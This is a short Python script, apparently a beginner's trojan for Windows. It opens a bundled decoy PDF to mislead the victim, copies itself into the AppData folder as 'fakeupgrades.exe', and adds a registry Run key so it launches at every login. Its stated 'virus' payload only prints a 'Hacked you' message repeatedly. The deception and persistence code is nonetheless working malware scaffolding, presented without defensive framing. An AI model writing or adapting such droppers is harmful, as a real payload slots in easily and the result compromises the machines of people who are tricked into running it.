# importing libs
import time
import subprocess as sp
import os
import shutil
import sys


def add_to_registery():
    # presistence
    # getting path of appdata
    new_path = os.environ["appdata"] + "\\fakeupgrades.exe"
    if not os.path.exists(new_path): # if there is no new path then create it
        # regedit command to execute virus at start
        regedit_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v fakeupgrade /t REG_SZ /d "{new_path}"' 

        # executing regedit command and moving virus to new path at appdata
        shutil.copyfile(sys.executable, new_path)
        sp.call(regedit_command, shell=True)

def open_fake_file(): 
    # when exe runs, opens a file (ex.: pdf)
    fake_file = sys._MEIPASS + "\\random_pdf.pdf"
    sp.Popen(fake_file, shell=True)


open_fake_file() # open decoy pdf at start
add_to_registery() # starting presistence

# virus function part (printing haked you 100 times in 50 secs)

x = 0
while x < 100:
    print("Hacked youuuuuu!!!")
    x += 1
    time.sleep(0.5)